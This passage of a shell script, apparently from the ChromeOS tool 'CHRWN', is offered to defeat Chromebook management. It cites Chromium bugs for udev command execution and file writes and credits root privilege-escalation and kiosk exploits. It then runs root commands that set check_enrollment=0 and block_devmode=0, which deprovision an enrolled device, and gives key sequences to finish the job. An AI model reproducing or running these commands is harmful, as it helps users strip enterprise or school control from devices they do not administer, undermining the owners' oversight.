...
# works on v75 through v83
# https://crbug.com/1072233 (udev command execution)
# https://crbug.com/1099390 (ImageBurner file write)

# !!! note: updated to auto-deprovision !!!

clear
echo "~~~ C H R W N ~~~~"
echo "credits: Bypassi (extension spoof concept), OlyB (root privesc), Rory McNamara (root privesc), B3AT (kiosk exploit), e9x (kiosk exploit), luphoria (payloads)"
echo "~~~ JOIN TITANIUMNETWORK : discord.gg/unblock ~~~"
...
case "$choice" in 
  y|Y ) echo "Deprovisioning..."
  	runasroot vpd -i RW_VPD -s check_enrollment=0
	runasroot vpd -i RW_VPD -s block_devmode=0
	runasroot crossystem block_devmode=0
	echo "Deprovisioned."
	echo "Press ESC + REFRESH + POWER, then CTRL + D, then ENTER, then Space to re-enable Verified mode. You should be deprovisioned.";;
  * ) echo "taken (n)o";;
esac
